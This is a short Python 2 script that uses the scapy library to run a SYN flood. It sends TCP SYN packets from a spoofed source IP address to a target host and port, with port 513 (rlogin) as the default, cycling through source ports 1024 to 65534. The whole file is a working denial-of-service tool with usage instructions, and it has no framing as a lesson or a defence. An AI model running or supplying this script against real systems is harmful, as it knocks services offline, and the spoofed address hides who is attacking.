#!/usr/bin/env python2
from scapy.all import *


def synFLOOD(s, t, d=513):
    for sport in range(1024, 65535):
        IPlayer = IP(src=s, dst=t)
        TCPlayer = TCP(sport=sport, dport=d)
        pkt = IPlayer / TCPlayer
        send(pkt)
        print("S_port = %d, D_port = %d"%(sport, d))


def main():
    if len(sys.argv) < 3:
        print("USAGE: %s %s %s %s" % (sys.argv[0], "[spoofed srcIP]", "[targetIP]", "[optional: dest port; def=513]")
)
        print("It spams the target IP with SYN packets, or it gets the availability again")
        sys.exit()
    else:
        if len(sys.argv) == 4:
            try:
                synFLOOD(sys.argv[1], sys.argv[2], int(sys.argv[3]))
            except Exception, X:
                print(str(X))
        else:
            try:
                synFLOOD(sys.argv[1], sys.argv[2])
            except Exception, X:
                print(str(X))

if __name__=="__main__":
    main()

